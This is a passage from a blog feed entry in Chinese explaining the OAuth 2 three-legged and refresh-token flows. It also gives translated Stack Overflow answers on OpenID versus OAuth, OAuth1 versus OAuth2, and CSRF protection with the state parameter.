 <li>服务器返回Access Toke    <ul>      <li>access_token</li>      <li>expires_in</li>      <li>token_type</li>    </ul>  </li></ol><h2 id="oauth-2-three-legged">OAuth 2 (Three Legged)</h2><ol>  <li>应用重定向用户到授权服务：    <ul>      <li>client_id</li>      <li>redirect_uri</li>      <li>response_type</li>      <li>state Optional; Unique identifier to protect against CSRF</li>      <li>scope Optional; what data your application can access.<br> url看起来会像是：        <br> oauth_service/login/oauth/authorize?client_id=3MVG9lKcPoNINVB&amp;redirect_uri=http://localhost/oauth/code_callback&amp;scope=user      </li>    </ul>  </li>  <li>用户登录服务器并确认授权给应用</li>  <li>服务器重定向用户到redirect_url ，附带参数：    <ul>      <li>code</li>      <li>state</li>    </ul>  </li>  <li>应用拿到code，并换取Access Token    <ul>      <li>client_id</li>      <li>client_secret</li>      <li>code</li>      <li>redirect_uri Optional;</li>      <li>grant_type = “authorization_code”</li>    </ul>  </li>  <li>如果的client_id和client_secret是有效的，服务器将调用一个回调redirect_url，包含ACCESS_TOKEN    <ul>      <li>access_token</li>      <li>expires_in</li>      <li>refresh_token</li>    </ul>  </li>  <li>应用保存ACCESS_TOKEN，在随后的请求中使用。通常这个值被存储在session或或cookie，需要时作为授权请求的参数。</li></ol><h2 id="oauth-2-refresh-token-刷新token">OAuth 2 (Refresh Token 刷新token)</h2><p>在OAuth2中，Token会有过期时间，我们必须去refresh_token，使用其他一些先前获得的参数，生成一个新的token。这是一个容易得多的流程。</p><ol>  <li>创建刷新令牌请求    <ul>      <li>grant_type = “refresh_token”</li>      <li>scope Optional; Cannot have any new scopes not previously defined.</li>      <li>refresh_token</li>      <li>client_id</li>      <li>client_secret</li>    </ul>  </li>  <li>服务验证和响应以下参数：    <ul>      <li>access_token</li>      <li>issued_at</li>    </ul>  </li></ol><h1>四、Stack Overflow上的一些问答</h1><p><strong>Q</strong>：OpenID和OAuth的区别是什么？</p><p><strong>A</strong>：OpenID是有关身份验证（即证明你是谁），OAuth有关授权（即授予访问权限），推荐博文：<a href="http://cakebaker.42dh.com/2008/04/01/openid-versus-oauth-from-the-users-perspective/" target="_blank" rel="noopener">从用户的角度来看OpenID和OAuth</a></p><p><strong>Q</strong>：OAuth2与OAuth1不同的地方是？有人可以简单的解释的OAuth2和OAuth1之间的区别吗？ OAuth1现在已经过时，应实施的OAuth2？我没有看到许多实现的OAuth2，大多数仍在使用OAuth，这让我怀疑的OAuth2的准备使用。是吗？</p><p><strong>A</strong>：OAuth2能更好地支持不是基于浏览器的应用。对于不是基于浏览器的应用程序，这是对OAuth的主要挑战。例如，在OAuth1.0，桌面应用或手机应用必须引导用户打开浏览器所需的服务，与服务进行身份验证，并复制令牌从服务返回给应用程序。这里的主要批评是针对用户体验。使用OAuth2.0，可以用新的方式为用户的应用程序获得授权。</p><p>OAuth2.0不再需要客户端应用程序拥有密钥。这让人回想起老的Twitter认证的API，它并不需要应用得到HMAC哈希令牌和请求字符串。使用OAuth2.0，应用程序可以通过HTTPS获得令牌。</p><p>OAuth2.0的签名流程简单得多。没有更多的特殊解析，排序，或编码。<br> OAuth2.0的访问令牌是“短命”的。通常情况下，OAuth1.0的访问令牌可以存储一年或一年以上（Twitter从来没有让他们到期）。 OAuth的2.0有刷新令牌的概念。虽然我不能完全肯定这是什么意思，我的猜测是，您的访问令牌可以是短暂存储的（即基于会话），而你可以刷新令牌。你使用刷新令牌获取新的访问令牌，而不是让用户重新授权您的应用程序。</p><p>最后，OAuth2.0使得负责处理的OAuth请求的服务器和处理用户的授权服务器之间的角色有一个干净的分离。更多信息，在上述的文章中详述。</p><p><strong>Q</strong>：OAuth2服务器群怎么使用state来防范CSRF？</p><p><strong>A</strong>：state只是一个随机的字符串，可以做这样的事情：$state = md5(uniqid(rand(), TRUE));在session中记录satate，以便稍后你能做验证。一些额外的资料：<a href="http://tools.ietf.org/html/draft-ietf-oauth-v2-threatmodel-00" target="_blank" rel="noopener">OAuth2威胁文件模型</a>，<a href="http://tools.ietf.org/html/draft-ietf-oauth-v2-26#section-10.12" target="_blank" rel="noopener">特别CSRF保护</a></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/476220c8/">http://home.meng.uno/articles/476220c8/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      一、写在前面
在收集资料时，我查询和学习了许多介绍OAuth的文章，这些文章有好有坏，但大多是从个例出发。因此我想从官方文档出发，结合在stackoverflow上的一些讨论，一并整理一下。整理的内容分为OAuth1.0a和OAuth2两部分。

OAuth 1.0a：One Leg -&gt; Two Leg -&gt; Three Legged
OAuth 2:Two Leg -&gt; Three Legged (附：Refresh Token的方式)

这两种模式都是按箭头从左往右安全性递增，其实现也会相对复杂。关于官方的这种leg（腿？）的说法，在中文翻译中比较少有文章提及。下面分别来介绍OAuth的
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="web" scheme="http://home.meng.uno/tags/web/"/>
    
      <category term="OAuth" scheme="http://home.meng.uno/tags/OAuth/"/>
    
  </entry>
  
</feed>
